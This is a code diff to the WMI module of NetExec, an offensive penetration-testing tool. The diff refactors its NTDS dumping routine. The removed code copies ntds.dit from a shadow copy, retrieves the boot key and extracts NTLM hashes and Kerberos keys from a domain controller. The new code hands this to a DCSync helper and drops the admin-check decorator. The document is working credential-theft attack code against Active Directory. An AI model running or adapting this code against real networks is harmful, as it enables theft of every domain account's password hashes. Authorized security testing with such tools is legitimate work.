@@ -11,13 +11,13 @@ from nxc.helpers.misc import sanitize_dns
 from nxc.config import process_secret
 from nxc.connection import connection, requires_admin
 from nxc.helpers.rpc import dcom_FirewallChecker
-from nxc.helpers.misc import validate_ntlm
 from nxc.logger import NXCAdapter
 from nxc.helpers.logger import highlight
 from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
 from nxc.protocols.wmi import wmiexec, wmiexec_event
 from nxc.protocols.wmi.remoteops import RemoteOperations
 from nxc.helpers.dpapi import DPAPITriage
+from nxc.helpers.dcsync import DCSync
 
 from dploot.lib.network.wmi import WMITarget as Target
 
@@ -27,7 +27,7 @@ from impacket.krb5 import constants
 from impacket.krb5.ccache import CCache
 from impacket.krb5.kerberosv5 import getKerberosTGT
 from impacket.krb5.types import Principal
-from impacket.examples.secretsdump import LSASecrets, SAMHashes, NTDSHashes
+from impacket.examples.secretsdump import LSASecrets, SAMHashes
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5 import transport, epm
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, MSRPC_BIND, MSRPCBind, CtxItem, MSRPCHeader, SEC_TRAILER, MSRPCBindAck
@@ -592,92 +592,14 @@ class wmi(connection):
         if not quiet:
             self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {output_filename + '.secrets'} and {output_filename + '.cached'}")
 
-    @requires_admin
     def ntds(self):
-        printed_kerb_keys_banner = False
-
-        def add_hash(secret_type, secret):
-            nonlocal printed_kerb_keys_banner
-            if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
-                self.logger.display("Kerberos keys:")
-                printed_kerb_keys_banner = True
-
-            # Count the type of secrets
-            if secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
-                add_hash.kerb_secrets += 1
-            else:
-                add_hash.nt_lm_secrets += 1
-
-            # Log the secret based on args
-            if self.args.enabled:
-                if "Enabled" in secret:
-                    secret = " ".join(secret.split(" ")[:-1])
-                    self.logger.highlight(secret)
-            else:
-                secret = " ".join(secret.split(" ")[:-1]) if " " in secret else secret
-                self.logger.highlight(secret)
-
-            # Filter out computer accounts, history hashes and kerberos keys for adding to db
-            if secret.find("$") == -1 and secret_type == NTDSHashes.SECRET_TYPE.NTDS and "_history" not in secret:
-                if secret.find("\\") != -1:
-                    _, clean_hash = secret.split("\\")
-                else:
-                    clean_hash = secret
-
-                try:
-                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
-                    parsed_hash = f"{lmhash}:{nthash}"
-                    if validate_ntlm(parsed_hash):
-                        add_hash.added_to_db += 1
-                        return
-                    raise
-                except Exception:
-                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
-            else:
-                self.logger.debug("Dumped hash is a computer account, not adding to db")
-
-        add_hash.nt_lm_secrets = 0
-        add_hash.kerb_secrets = 0
-        add_hash.added_to_db = 0
-
-        output_filename = self.output_file_template.format(output_folder="ntds")
-
-        bootkey = self.remote_ops.get_bootkey(output_filename)
-        if bootkey is None:
-            return
-
-        # Get the NTDS.dit file
-        ntds_file = f"{self.remote_ops.shadow_copy_path}\\Windows\\NTDS\\ntds.dit"
-        if not self.get_file_single(ntds_file, f"{output_filename}.ntds.dit"):
-            self.logger.fail("Could not download NTDS.dit file")
-            return
-
-        NTDS = NTDSHashes(
-            f"{output_filename}.ntds.dit",
-            self.remote_ops.bootkey,
-            isRemote=False,
-            history=self.args.history,
-            noLMHash=True,
-            justNTLM=not self.args.kerberos_keys,
-            useVSSMethod=True,
-            remoteOps=None,
-            pwdLastSet=False,
-            resumeSession=None,
-            outputFileName=f"{output_filename}.ntds",
-            justUser=self.args.userntds if self.args.userntds else None,
-            printUserStatus=True,
-            perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret),
-        )
-
         try:
-            self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
-            NTDS.dump()
-            ntds_outfile = f"{output_filename}.ntds"
-            self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile}")
-            if self.args.kerberos_keys:
-                self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
-            self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
-            self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
+            DCSync(self).dump(
+                user=self.args.userntds,
+                history=self.args.history,
+                kerberos_keys=self.args.kerberos_keys,
+                enabled=self.args.enabled,
+            )
         except Exception as e:
             self.logger.fail(e)
 
